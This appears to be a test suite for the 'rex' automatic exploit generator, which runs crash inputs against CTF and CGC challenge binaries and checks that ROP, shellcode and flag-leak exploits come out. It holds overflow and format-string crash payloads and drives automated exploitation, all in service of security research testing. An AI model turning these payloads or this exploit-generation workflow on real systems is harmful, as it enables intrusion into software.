import os
import sys
import nose
import flaky
import struct
import logging

import rex
import colorguard
from rex.vulnerability import Vulnerability
from angr.state_plugins.trace_additions import FormatInfoStrToInt, FormatInfoDontConstrain

bin_location = str(os.path.join(os.path.dirname(os.path.realpath(__file__)), '../../binaries'))
cache_location = str(os.path.join(bin_location, 'tests_data/rop_gadgets_cache'))
tests_dir = str(os.path.dirname(os.path.realpath(__file__)))


def _do_pov_test(pov, enable_randomness=True):
    ''' Test a POV '''
    for _ in range(10):
        if pov.test_binary(enable_randomness=enable_randomness):
            return True
    return False

def test_legit_00001():
    # Test exploitation of legit_00001 given a good crash.

    crash = bytes.fromhex('1002000041414141414141414141414d41414141414141414141414141414141001041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412a4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141604141414141414141414102ffffff410080ffff4141410d807f412641414141414141414141414141414141414141413b41415f414141412b41414141417f4141414141412441414141416041f8414141414141c1414139410010000200005541415f4141b9b9b9b1b9d4b9b9b9b99cb99ec4b9b9b941411f4141414141414114414141514141414141414141414141454141494141414141414141404141414141414d414124a0414571717171717171717171717171717171616161616161616161616161616161006161515e41414141412041414141412125414141304141492f41414141492f4141414541412c4141410037373737373737373737414141414141413a41c4b9b9b9b901b9413c41414141414141414141414141412133414141414141412f414141414141414164414141414141414141414141417f41414100010000000055414b4100124141414141414141')

    crash = rex.Crash(os.path.join(bin_location, "tests/defcon24/legit_00001"), crash, fast_mode=True,
                                   rop_cache_path=os.path.join(cache_location, 'legit_00001'), use_crash_input=True)

    arsenal = crash.exploit(blacklist_techniques={'rop_set_register', 'rop_leak_memory'})

    nose.tools.assert_true(len(arsenal.register_setters) >= 2)
    nose.tools.assert_true(len(arsenal.leakers) >= 1)

    for reg_setter in arsenal.register_setters:
        nose.tools.assert_true(_do_pov_test(reg_setter))

    for leaker in arsenal.leakers:
        nose.tools.assert_true(_do_pov_test(leaker))

def test_legit_00003():
    # Test exploration and exploitation of legit_00003.

    crash = b"1\n" + b"A" * 200
    crash = rex.Crash(os.path.join(bin_location, "tests/defcon24/legit_00003"), crash, fast_mode=True, rop_cache_path=os.path.join(cache_location, 'legit_00003'))

    nose.tools.assert_true(crash.explorable())
    nose.tools.assert_true(crash.one_of(Vulnerability.WRITE_WHAT_WHERE))

    crash.explore()

    arsenal = crash.exploit(blacklist_techniques={'rop_set_register', 'rop_leak_memory'})

    nose.tools.assert_true(len(arsenal.register_setters) >= 2)
    nose.tools.assert_true(len(arsenal.leakers) >= 1)

    for reg_setter in arsenal.register_setters:
        nose.tools.assert_true(_do_pov_test(reg_setter))

    for leaker in arsenal.leakers:
        nose.tools.assert_true(_do_pov_test(leaker))

def break_controlled_printf():#L90
    # Test ability to turn controlled format string into Type 2 POV.

    crash = "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%X%x%sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    binary = os.path.join(bin_location, "tests/i386/controlled_printf")
    crash = rex.Crash(binary, crash, rop_cache_path=os.path.join(cache_location, 'controlled_printf'))

    nose.tools.assert_true(crash.one_of(Vulnerability.ARBITRARY_READ))

    flag_leaks = list(crash.point_to_flag())

    nose.tools.assert_true(len(flag_leaks) >= 1)

    cg = colorguard.ColorGuard(binary, flag_leaks[0])

    nose.tools.assert_true(cg.causes_leak())

    pov = cg.attempt_pov()

    nose.tools.assert_true(_do_pov_test(pov, enable_randomness=False))

def test_shellcode_placement():
    # Test that shellcode is placed in only executable memory regions.

    crash = b"A" * 272
    crash = rex.Crash(os.path.join(bin_location, "tests/i386/shellcode_tester"), crash, fast_mode=True, rop_cache_path=os.path.join(cache_location, 'shellcode_tester'))

    arsenal = crash.exploit(blacklist_techniques={'rop_leak_memory', 'rop_set_register'})

    exploit = arsenal.register_setters[0]

    # make sure the shellcode was placed into the executable heap page
    heap_top = crash.state.solver.eval(crash.state.cgc.allocation_base)
    nose.tools.assert_equal(struct.unpack("<I", exploit._raw_payload[-4:])[0] & 0xfffff000, heap_top)

    exec_regions = list(filter(lambda a: crash.state.solver.eval(crash.state.memory.permissions(a)) & 0x4, crash.symbolic_mem))

    # should just be two executable regions
    nose.tools.assert_equal(len(exec_regions), 2)

    # only executable regions should be that one heap page and the stack, despite having more heap control and global control
    nose.tools.assert_equal(sorted(exec_regions), sorted([0xb7ffb000, 0xbaaaaeec]))

def test_boolector_solving():
    # Test boolector's ability to generate the correct values at pov runtime.

    crash = b"A" * 64 * 4
    crash = rex.Crash(os.path.join(bin_location, "tests/i386/add_payload"), crash, fast_mode=True, rop_cache_path=os.path.join(cache_location, 'add_payload'))

    arsenal = crash.exploit(blacklist_techniques={'rop_leak_memory'})

    nose.tools.assert_true(len(arsenal.register_setters) >= 3)
    nose.tools.assert_true(len(arsenal.leakers) >= 1)

    for reg_setter in arsenal.register_setters:
        nose.tools.assert_true(_do_pov_test(reg_setter))

    for leaker in arsenal.leakers:
        nose.tools.assert_true(_do_pov_test(leaker))

def break_cpp_vptr_smash():#L165
    # Test detection of 'arbitrary-read' vulnerability type, exploration of the crash, and exploitation post-exploration

    crash = b"A" * 512
    crash = rex.Crash(os.path.join(bin_location, "tests/i386/vuln_vptr_smash"), crash, rop_cache_path=os.path.join(cache_location, 'vuln_vptr_smash'))

    # this should just tell us that we have an arbitrary-read and that the crash type is explorable
    # but not exploitable
    nose.tools.assert_true(crash.one_of(Vulnerability.ARBITRARY_READ))
    nose.tools.assert_false(crash.exploitable())
    nose.tools.assert_true(crash.explorable())

    crash.explore()
    # after exploring the crash we should see that it is exploitable
    nose.tools.assert_true(crash.exploitable)
    nose.tools.assert_true(crash.state.solver.symbolic(crash.state.regs.pc))

    # let's generate some exploits for it
    arsenal = crash.exploit()

    # make sure we have three register setting exploits (one for each technique)
    nose.tools.assert_true(len(arsenal.register_setters) >= 2)

    # make sure we can also generate some leakers, should be rop and shellcode at this point
    nose.tools.assert_true(len(arsenal.leakers) >= 2)

    # make sure the test succeeds on every register setter
    for reg_setter in arsenal.register_setters:
        nose.tools.assert_true(_do_pov_test(reg_setter))

    # make sure the test succeeds on every leaker
    for leaker in arsenal.leakers:
        nose.tools.assert_true(_do_pov_test(leaker))

def test_linux_stacksmash():
    # Test exploiting a simple linux program with a stack buffer overflow. We should be able to exploit the test binary by
    # ropping to 'system', calling shellcode in the BSS and calling 'jmpsp' shellcode in the BSS.

    crash = b"A" * 227
    crash = rex.Crash(os.path.join(bin_location, "tests/i386/vuln_stacksmash"), crash, fast_mode=True, rop_cache_path=os.path.join(cache_location, 'vuln_stacksmash'),
            tracer_args={'ld_linux': os.path.join(bin_location, 'tests/i386/ld-linux.so.2'),
                'library_path': os.path.join(bin_location, 'tests/i386')})
    exploit = crash.exploit(blacklist_techniques={'rop_leak_memory', 'rop_set_register'})

    # make sure we're able to exploit it in all possible ways
    nose.tools.assert_equal(len(exploit.arsenal), 3)
    nose.tools.assert_true('rop_to_system' in exploit.arsenal)
    nose.tools.assert_true('call_shellcode' in exploit.arsenal)
    nose.tools.assert_true('call_jmp_sp_shellcode' in exploit.arsenal)

    # TODO test exploit with pwntool's 'process'

def test_cgc_type1_rop_stacksmash():
    # Test creation of type1 exploit on 0b32aa01_01 ('Palindrome') with rop. The vulnerability exposed by the string `crash` is
    # stack buffer overflow. This testcase should exercise rex exploiting stack-based buffer overflows with rop.

    crash = bytes.fromhex("0500ffff80ffffff80f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1ffff80f1f1f1ebf1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f100de7fff80ffffff800fffffff7ef3ffffffff7fffff80fffffeff09fefefefefe0a57656c63fe6d6520746f2850616c696e64726f6d65204669776465720a0affffffff80ffffe8800fffffff7f230a")

    crash = rex.Crash(os.path.join(bin_location, "tests/cgc/sc1_0b32aa01_01"), crash, fast_mode=True, rop_cache_path=os.path.join(cache_location, 'sc1_0b32aa01_01'))
    arsenal = crash.exploit()

    # make sure we can control ecx, edx, ebx, ebp, esi, and edi with rop
    nose.tools.assert_true(len(arsenal.register_setters) >= 3)
    nose.tools.assert_true(len(arsenal.leakers) >= 2)

    # make sure the test succeeds on every register setter
    for reg_setter in arsenal.register_setters:
        nose.tools.assert_true(_do_pov_test(reg_setter))

    # make sure the test succeeds on every leaker
    for leaker in arsenal.leakers:
        nose.tools.assert_true(_do_pov_test(leaker))


def test_exploit_yielding():
    # Test the yielding of exploits

    crash = bytes.fromhex("0500ffff80ffffff80f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1ffff80f1f1f1ebf1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f100de7fff80ffffff800fffffff7ef3ffffffff7fffff80fffffeff09fefefefefe0a57656c63fe6d6520746f2850616c696e64726f6d65204669776465720a0affffffff80ffffe8800fffffff7f230a")

    crash = rex.Crash(os.path.join(bin_location, "tests/cgc/sc1_0b32aa01_01"), crash, fast_mode=True, rop_cache_path=os.path.join(cache_location, 'sc1_0b32aa01_01'))

    leakers = 0
    register_setters = 0
    for exploit in crash.yield_exploits():
        leakers += 1 if exploit.cgc_type == 2 else 0
        register_setters += 1 if exploit.cgc_type == 1 else 0
        nose.tools.assert_true(_do_pov_test(exploit))

    # make sure we can generate a few different exploits
    nose.tools.assert_true(register_setters >= 3)
    nose.tools.assert_true(leakers >= 2)

def _do_arbitrary_transmit_test_for(binary):
    crash_input = b"A"*0x24
    binary = os.path.join(bin_location, binary)
    crash = rex.Crash(binary, crash_input, fast_mode=True, rop_cache_path=os.path.join(cache_location, os.path.basename(binary)))
    zp = crash.state.get_plugin("zen_plugin")
    nose.tools.assert_true(len(zp.controlled_transmits) == 1)

    flag_leaks = list(crash.point_to_flag())

    nose.tools.assert_true(len(flag_leaks) >= 1)

    for ptfi in flag_leaks:
        try:
            cg = colorguard.ColorGuard(binary, ptfi)
            nose.tools.assert_true(cg.causes_leak())
            pov = cg.attempt_exploit()
            nose.tools.assert_true(pov.test_binary())

        except rex.CannotExploit:
            raise Exception("should be exploitable")

def test_arbitrary_transmit():
    # Test our ability to exploit an arbitrary transmit
    _do_arbitrary_transmit_test_for("tests/i386/arbitrary_transmit")

def break_KPRCA_00057(): # L284
    # This test requires pointing an arbitrary transmit using atoi at the flag

    with open(os.path.join(tests_dir, "KPRCA_00057_crash"), 'rb') as f:
        crash = f.read()

    # set up hooks
    format_infos = []
    format_infos.append(FormatInfoStrToInt(0x8049e90, "based_atoi_8", str_arg_num=0, base=8,
                       base_arg=None, allows_negative=False))
    format_infos.append(FormatInfoStrToInt(0x804b3b0, "strtol", str_arg_num=0, base=None,
                       base_arg=2, allows_negative=False))
    format_infos.append(FormatInfoStrToInt(0x804b160, "strtol", str_arg_num=0, base=None,
                       base_arg=2, allows_negative=False))
    format_infos.append(FormatInfoDontConstrain(0x8049e90, "fdprintf", 1))

    binary = os.path.join(bin_location, "tests/cgc/KPRCA_00057")
    crash = rex.Crash(binary, crash, format_infos=format_infos, rop_cache_path=os.path.join(cache_location, 'KPRCA_00057_crash'))

    nose.tools.assert_true(crash.one_of(Vulnerability.ARBITRARY_TRANSMIT))

    flag_leaks = list(crash.point_to_flag())

    nose.tools.assert_true(len(flag_leaks) >= 1)

    cg = colorguard.ColorGuard(binary, flag_leaks[0])
    cg.causes_leak()
    pov = cg.attempt_pov()

    nose.tools.assert_true(_do_pov_test(pov))

def test_arbitrary_transmit_no_crash():
    # Test our ability to exploit an arbitrary transmit which does not cause a crash

    _do_arbitrary_transmit_test_for("tests/i386/arbitrary_transmit_no_crash")

def test_reconstraining():
    # Test our ability to reconstrain

    crash_input = b'3\x89111'+b'0'+b'A'*190+b'1'

    binary = os.path.join(bin_location, "tests/cgc/PIZZA_00003")

    crash = rex.Crash(binary, crash_input, fast_mode=True, rop_cache_path=os.path.join(cache_location, 'PIZZA_00003'))

    ptfi = list(crash.point_to_flag())
    nose.tools.assert_true(len(ptfi) >= 2)

    # test point to flag #1
    cg = colorguard.ColorGuard(binary, ptfi[0])
    x = cg.attempt_exploit()
    nose.tools.assert_not_equals(x, None)
    nose.tools.assert_true(_do_pov_test(x))

    # test point to flag #2
    cg = colorguard.ColorGuard(binary, ptfi[1])
    x = cg.attempt_exploit()
    nose.tools.assert_not_equals(x, None)
    nose.tools.assert_true(_do_pov_test(x))


def test_cromu71():
    crash_input = b'3&\x1b\x17/\x12\x1b\x1e]]]]]]]]]]]]]]]]]]]]\n\x1e\x7f\xffC^\n'

    binary = os.path.join(bin_location, "tests/cgc/simplified_CROMU_00071")

    # create format info for atoi
    format_infos = []
    format_infos.append(FormatInfoStrToInt(0x804C500, "based_atoi_signed_10", str_arg_num=0, base=10,
                                           base_arg=None, allows_negative=True))

    crash = rex.Crash(binary, crash_input, fast_mode=True, rop_cache_path=os.path.join(cache_location, 'simplified_CROMU_00071'))

    # let's generate some exploits for it
    arsenal = crash.exploit(blacklist_techniques={'rop_set_register', 'rop_leak_memory'})

    # make sure it works
    nose.tools.assert_true(_do_pov_test(arsenal.best_type1))

@flaky.flaky(3, 1)
def test_quick_triage():
    # Test our ability to triage crashes quickly.

    crash_tuples = [
            (bytes.fromhex("1002000041414141414141414141414d41414141414141414141414141414141001041414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412a4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141604141414141414141414102ffffff410080ffff4141410d807f412641414141414141414141414141414141414141413b41415f414141412b41414141417f4141414141412441414141416041f8414141414141c1414139410010000200005541415f4141b9b9b9b1b9d4b9b9b9b99cb99ec4b9b9b941411f4141414141414114414141514141414141414141414141454141494141414141414141404141414141414d414124a0414571717171717171717171717171717171616161616161616161616161616161006161515e41414141412041414141412125414141304141492f41414141492f4141414541412c4141410037373737373737373737414141414141413a41c4b9b9b9b901b9413c41414141414141414141414141412133414141414141412f414141414141414164414141414141414141414141417f41414100010000000055414b4100124141414141414141"), "tests/defcon24/legit_00001", Vulnerability.IP_OVERWRITE),
            (b"1\n" + b"A" * 200, "tests/defcon24/legit_00003", Vulnerability.WRITE_WHAT_WHERE),
            (bytes.fromhex("0500ffff80ffffff80f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1ffff80f1f1f1ebf1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f1f100de7fff80ffffff800fffffff7ef3ffffffff7fffff80fffffeff09fefefefefe0a57656c63fe6d6520746f2850616c696e64726f6d65204669776465720a0affffffff80ffffe8800fffffff7f230a"), "tests/cgc/sc1_0b32aa01_01", Vulnerability.IP_OVERWRITE),
            (b"A" * 512, "tests/i386/vuln_vptr_smash", Vulnerability.ARBITRARY_READ),
            (bytes.fromhex("00ea01ffe7fffffffbe3c0d9d9d9d9d9d9d9d9e6e6e6000000e90beae9e9e9e9e9e9d9e6e6e6000000e9e9e9e9e90000f320e9e9e9e9e9e9e900008000e3e3e3e3e3e3e3e3e3e3e3e3e3d8e3e3e3e3e3d2e3e3e3e3e3e3e9e9e9e97fffe9e9e9e9e9e9f1e9e9e9f6e9e9e9e9e9e9e9e9ebe9e9e9e9e9e9e9e9e9e9e9ffff8080e990e9e9ece9e9e9e9e9e9e9e9e9e9e90000ff20e9e9e9e9e9e9e900008000e3e3e3e3e3e3e3e3e3e3e3e3e3e3dde3e3e3e3e3e3e3e3e3e3e3e9e9e9f27fffe9a9e9e9e9e9f1e9e9e9e9e9e9e9e9e9e9e9e9ebe9e9e9e90080e9e91001e9e9e90000d9d9d9d9d9d9d9d9c2d9dae60200"), "tests/cgc/474a5e01_01", Vulnerability.NULL_DEREFERENCE),
            (bytes.fromhex("6675e263640a6e65777a64656c6976657265720a25642525252525252525252525252525257373732525252525252525620a0a0a160a6e6577a670697a7a610a646572656465656c6376300a0a0a0a0a64656c69766572658110006c6976657065720a0a0a8a304a0a0a0a0a64656c697665726564720a720a0a937a770a0a0a0f64656c6976657265720a0a0a8a6e7a5800110f64656c6976657265"), "tests/cgc/PIZZA_00002", Vulnerability.NULL_DEREFERENCE),
            (bytes.fromhex("ac0bfffc100000acffffff1c9fc01600100000acffffff1c9fc01600009b0bfffe2f0000"), "tests/i386/arbitrary_transmit", Vulnerability.ARBITRARY_TRANSMIT),
    ]

    for tup in crash_tuples:
        crash_input = tup[0]
        binary_path = os.path.join(bin_location, tup[1])
        expected_tp = tup[2]

        qc = rex.QuickCrash(binary_path, crash_input)
        nose.tools.assert_true(qc.kind == expected_tp)

def run_all():
    functions = globals()
    all_functions = dict(filter((lambda kv: kv[0].startswith('test_')), functions.items()))
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            print(f)
            all_functions[f]()

if __name__ == "__main__":
    logging.getLogger("rex").setLevel("DEBUG")
    logging.getLogger("povsim").setLevel("DEBUG")
    logging.getLogger("angr.state_plugins.preconstrainer").setLevel("DEBUG")
    logging.getLogger("angr.simos").setLevel("DEBUG")
    logging.getLogger("angr.exploration_techniques.tracer").setLevel("DEBUG")
    logging.getLogger("angr.exploration_techniques.crash_monitor").setLevel("DEBUG")

    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()
